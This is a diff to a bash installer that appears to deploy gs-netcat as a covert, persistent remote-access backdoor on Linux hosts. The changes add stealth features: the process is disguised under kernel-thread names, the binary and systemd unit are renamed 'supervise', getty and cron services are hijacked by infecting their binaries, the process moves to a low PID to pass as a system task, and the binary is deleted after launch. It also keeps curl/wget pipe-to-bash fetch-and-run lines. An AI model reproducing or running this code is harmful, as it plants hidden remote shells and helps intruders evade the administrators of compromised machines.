@@ -43,11 +43,16 @@
 #       - Only connect back every 30 minutes and check for a client.
 # GS_NOINFECT=1
 #       - Try NO to infect a systemd service before any other persistency
+# GS_NOFFPID=1
+#       - Do not fast forward to a small pid.
 # GS_NAME="[kcached]"
 #       - Specify custom hidden name file & process. Default is picked at random.
-# GS_BIN="core"
+# GS_BIN="supervise"
 #       - Specify custom name for binary on filesystem
 #       - Set to GS_NAME if GS_NAME is specified.
+# GS_SERVICE="supervise"
+#       - Name for systemd's supervise.service
+#       - Set to GS_BIN by default
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl.
 # GS_TG_TOKEN=
@@ -138,7 +143,7 @@ unset msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
-BIN_HIDDEN_NAME_DEFAULT="core"
+BIN_HIDDEN_NAME_DEFAULT="supervise"
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
 proc_name_arr=("[kstrp]" "[watchdogd]" "[ksmd]" "[kswapd0]" "[card0-crtc8]" "[mm_percpu_wq]" "[rcu_preempt]" "[kworker]" "[raid5wq]" "[slub_flushwq]" "[netns]" "[kaluad]")
 # Pick a process name at random
@@ -154,6 +159,8 @@ CONFIG_DIR_NAME="mc"
 
 GS_INFECT=1
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
+GS_FFPID=1
+[[ -n $GS_NOFFPID ]] && unset GS_FFPID
 
 # systemd candidates for binary infection
 # res=$(command -v dbus-daemon) && {
@@ -173,9 +180,14 @@ GS_INFECT=1
 # 	INFECT_SYSCTL_NAME_ARR+=("rsyslog")
 # }
 # => Got notification message from PID 52031, but reception only permitted for main PID 52029
-res=$(command -v agetty) && {
+res=$(command -v agetty) && systemctl is-active --quiet 'getty@tty1' &>/dev/null && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
 	INFECT_SYSCTL_NAME_ARR+=("getty@tty1")
+	# [[ "$(pgrep -c agetty 2>/dev/null)" -gt 1 ]] && {
+		# More that 1 agetty process. 
+		# systemctl show getty@tty1 --property=ExecStart
+	# }
+	systemctl show 'getty@tty1' --property=ExecStart | grep -qm1 -F "noclear" && INFECT_SYSTEMD_ARGV_MATCH="noclear"
 }
 res=$(command -v cron) && {
 	INFECT_BIN_NAME_ARR+=("${res:?}")
@@ -183,7 +195,7 @@ res=$(command -v cron) && {
 }
 
 # Names for 'uninstall' (including names from previous versions)
-BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
+BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "core" "defunct" "gs-dbus" "gs-db")
 CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "htop" "dbus")
 
 [[ -t 1 ]] && {
@@ -657,6 +669,7 @@ init_vars()
 	[[ -z "$PWD" ]] && PWD="$(pwd 2>/dev/null)"
 
 	[[ "$GS_BEACON" -eq 0 ]] && unset GS_BEACON
+	[[ "$GS_BEACON" -gt 0 ]] && [[ "$GS_BEACON" -lt 10 ]] && GS_BEACON=10
 	[[ "$GS_DEBUG" -eq 0 ]] && unset GS_DEBUG
 
 	[[ -z "$OSTYPE" ]] && {
@@ -783,7 +796,8 @@ init_vars()
 		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
 	fi
 
-	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
+	SERVICE_HIDDEN_NAME="${GS_SERVICE:-$BIN_HIDDEN_NAME}"
+	SERVICE_HIDDEN_NAME="${SERVICE_HIDDEN_NAME%%.*}"
 
 	if [[ $OSTYPE == *darwin* ]]; then
 		# on OSX 'pkill' and 'killall' match the process (argv[0]) whereas on Unix
@@ -1216,7 +1230,7 @@ config2bin() {
 		cp -p "${src}" "${dst}" || return 255
 	}
 
-	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_BEACON="${GS_BEACON}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
+	TERM=xterm-256color GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_STEALTH=1 GS_CONFIG_WRITE="${dst}" GS_ARGS="${opts}" GS_SECRET="${GS_SECRET:?}" "${src}" || return 255
 	[[ -n "$dst_final" ]] && {
 		cat "${dst}" >"${dst_final}"
 		rm -f "${dst:?}"
@@ -1237,8 +1251,8 @@ bin2config() {
 	unset GS_CONFIG_BEACON
 	unset GS_CONFIG_HOST
 	unset GS_CONFIG_PORT
-	[[ ! -f "${exe}" ]] && return
-	[[ ! -f "${bin}" ]] && return
+	[[ ! -f "${exe}" ]] && return 255
+	[[ ! -f "${bin}" ]] && return 255
 
 	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exe:?}" -h 2>/dev/null | grep ^GS_CONFIG_)"
 }
@@ -1349,7 +1363,6 @@ install_systemd_new() {
 	mk_file "${SERVICE_FILE}" || return 255
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
-Description=Offline ext4 Metadata Check for All Filesystems
 After=network.target
 
 [Service]
@@ -1366,6 +1379,7 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}" || return 255
 	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
+	IS_SYSTEMD_STANDALONE=1
 	((IS_INSTALLED+=1))
 	OK_OUT
 }
@@ -1391,6 +1405,7 @@ install_systemd_infect() {
 
 	SYSTEMD_INFECTED_NAME="${name}"
 	INFECTED_BIN_NAME="${bin}"
+	GS_SYSTEMD_ARGV_MATCH="${INFECT_SYSTEMD_ARGV_MATCH}"
 	IS_SYSTEMD=1
 	((IS_INSTALLED+=1))
 	OK_OUT "Experimental. Set GS_NOINFECT=1 to disable."
@@ -1612,7 +1627,7 @@ dl()
 		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
 		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
 		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
-		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
+		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1}). Try setting GS_USELOCAL_GSNC="
 		errexit
 	fi
 
@@ -1665,11 +1680,11 @@ test_bin()
 
 	# Try to execute the binary
 	unset ERR_LOG
-	GS_OUT=$("$bin" -g 2>/dev/null)
+	GS_OUT=$(GS_CONFIG_READ=0 "$bin" -g 2>/dev/null)
 	[[ -z "$GS_OUT" ]] && {
 		# 126 - Exec format error
 		FAIL_OUT
-		ERR_LOG="$("$bin" -g 2>&1 1>/dev/null)"
+		ERR_LOG="$(GS_CONFIG_READ=0 "$bin" -g 2>&1 1>/dev/null)"
 		WARN_EXECFAIL_SET "$ret" "wrong binary"
 		return
 	}
@@ -1771,11 +1786,9 @@ show_install_config() {
 		echo -e "Name    : ${CDG}${PROC_HIDDEN_NAME}${CN} ${CF}[GS_NAME= to change]${CN}"
 	}
 
+	[[ -n $IS_SYSTEMD_STANDALONE ]] && echo -e "Service : ${CDG}${SERVICE_HIDDEN_NAME}.service${CN} ${CF}[GS_SERVICE= to change]${CN}"
 	str="always connected ${CN}${CF}[GS_BEACON=30 to change]"
-	[[ -n $GS_BEACON ]] && {
-		[[ $GS_BEACON -lt 10 ]] && GS_BEACON=30
-		str="every $GS_BEACON minutes"
-	}
+	[[ -n $GS_BEACON ]] && str="every $GS_BEACON minutes"
 	echo -e "Beacon  : ${CDG}${str}${CN}"
 }
 
@@ -1842,7 +1855,7 @@ install()
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
-	xmv "${_GS_TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	xmv "${_GS_TMPDIR}/gs-netcat" "${DSTBIN:?}" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
@@ -1986,6 +1999,7 @@ if [[ -z $GS_NOINST ]]; then
 	fi
 else
 	echo -e "GS_NOINST is set. Skipping installation."
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "-ilqD" "${PROC_HIDDEN_NAME}"
 fi
 # -----END Install permanentally-----
 
@@ -1995,12 +2009,26 @@ fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
 
+[[ -n "$GS_FFPID" ]] && {
+	echo -en "Using low PID. May take 40 sec. Set GS_NOFFPID=1 to disable..........."
+	if res=$(GS_UTIL_FFPID=1 GS_CONFIG_READ=0 "${DSTBIN:-$INFECTED_BIN_NAME}" 2>/dev/null); then
+		OK_OUT "Low PID found at ~${res:-NA}"
+	else
+		SKIP_OUT "PID forwarded to ${res:-NA} only"
+	fi
+}
+
 webhooks
 show_install_config
 
 HOWTO_CONNECT_OUT
 
+# Do this after show_install_config so that user always sees the GS_SECRET.
 gs_start
+
+# Give gsnc enough time to read the configuration from its own binary before deleting.
+[[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
+
 echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
 
 exit_code 0
